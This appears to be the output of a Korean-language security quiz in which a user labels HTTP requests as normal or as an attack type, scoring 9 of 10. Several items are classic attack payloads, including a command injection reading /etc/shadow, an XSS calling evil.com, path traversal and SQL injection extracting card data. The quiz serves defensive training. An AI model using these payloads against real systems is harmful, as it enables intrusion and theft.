=================================================================
  [퀴즈] HTTP 요청을 보고 공격 유형을 맞혀보세요!
=================================================================
  보기: 정상 / SQL Injection / XSS / Command Injection / Path Traversal
  (종료하려면 'q' 입력)

  ─── 문제 1/10 ───
  요청: GET /products?category=shoes&page=2 HTTP/1.1

  답: 정상
  >> 정답! [정상]
  >> 해설: 상품 카테고리 조회 요청으로, 파라미터에 이상한 패턴이 없습니다.

  ─── 문제 2/10 ───
  요청: POST /api/users HTTP/1.1  body: {name: 'Kim', email: 'kim@test.com'}

  답: 정상
  >> 정답! [정상]
  >> 해설: 일반적인 사용자 등록 API 요청입니다.

  ─── 문제 3/10 ───
  요청: GET /login?user=admin&pw=' OR '1'='1 HTTP/1.1

  답: SQL Injection
  >> 정답! [SQL Injection]
  >> 해설: ' OR '1'='1 은 SQL WHERE 절을 항상 참으로 만드는 대표적인 SQL Injection 패턴입니다.     

  ─── 문제 4/10 ───
  요청: GET /download?file=report.pdf; cat /etc/shadow HTTP/1.1

  답: Command Injection
  >> 정답! [Command Injection]
  >> 해설: ; 뒤에 cat /etc/shadow 명령어를 삽입하여 서버의 비밀번호 파일을 읽으려는 명령어 인젝션  공격입니다.

  ─── 문제 5/10 ───
  요청: GET /about HTTP/1.1

  답: 정상
  >> 정답! [정상]
  >> 해설: 소개 페이지 접근으로 완전히 정상적인 요청입니다.

  ─── 문제 6/10 ───
  요청: POST /comment HTTP/1.1  body: msg=<img src=x onerror=fetch('http://evil.com/steal')>       

  답: XSS
  >> 정답! [XSS]
  >> 해설: img 태그의 onerror 이벤트를 악용한 XSS 공격입니다. 이미지 로드 실패 시 악성 코드가 실행 됩니다.

  ─── 문제 7/10 ───
  요청: GET /files/../../../etc/passwd HTTP/1.1

  답: Path Traversal
  >> 정답! [Path Traversal]
  >> 해설: ../를 반복하여 서버의 상위 디렉토리로 이동, /etc/passwd 파일에 접근하려는 경로 탐색 공격입니다.

  ─── 문제 8/10 ───
  요청: GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1

  답: XSS
  >> 정답! [XSS]
  >> 해설: <script> 태그를 검색어에 삽입하여 다른 사용자의 쿠키를 탈취하려는 XSS 공격입니다.       

  ─── 문제 9/10 ───
  요청: GET /api/products?id=5 UNION SELECT credit_card, cvv FROM payments HTTP/1.1

  답: 정상
  >> 오답! 정답은 [SQL Injection]
  >> 해설: UNION SELECT로 다른 테이블(payments)의 신용카드 정보를 추출하려는 SQL Injection 공격입니다.

  ─── 문제 10/10 ───
  요청: GET /index.html HTTP/1.1

  답: 정상
  >> 정답! [정상]
  >> 해설: 일반적인 웹 페이지 접근 요청입니다.


=================================================================
  결과: 9/10 (90%)
  >> 좋습니다! 대부분의 공격을 잘 구분했습니다.
=================================================================